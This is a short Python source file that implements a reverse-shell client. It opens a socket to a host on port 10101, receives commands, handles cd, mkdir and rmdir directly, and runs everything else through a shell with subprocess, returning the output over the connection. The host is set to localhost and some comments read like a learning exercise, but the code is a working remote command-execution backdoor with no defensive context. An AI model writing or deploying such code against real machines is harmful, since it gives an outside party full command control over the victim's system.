import os
import socket
import subprocess


class Client(object):
    host = ""
    sckt = None

    def __init__(self, host):
        self.host = host
        self.sckt = socket.socket()
        self.sckt.connect((self.host, 10101))

    def receive_commands(self):
        while True:
            data = self.sckt.recv(1024)
            # store decoded data as separate variable
            # check how to return to home directory with "cd"
            if data[:2].decode("utf-8") == "cd":
                os.chdir(data[3:].decode("utf-8"))
                self.sckt.send(" ")
            elif data[:5].decode("utf-8") == "mkdir":
                os.mkdir(data[6:].decode("utf-8"))
                self.sckt.send(" ")
            elif data[:5].decode("utf-8") == "rmdir":
                os.rmdir(data[6:].decode("utf-8"))
                self.sckt.send(" ")
            elif len(data) > 0:
                command = subprocess.Popen(data.decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                output = str(command.stdout.read() + command.stderr.read())
                self.sckt.send(str.encode(output) + " ")
        self.sckt.close()


def main():
    client = Client("127.0.0.1")
    client.receive_commands()


if __name__ == "__main__":
    main()
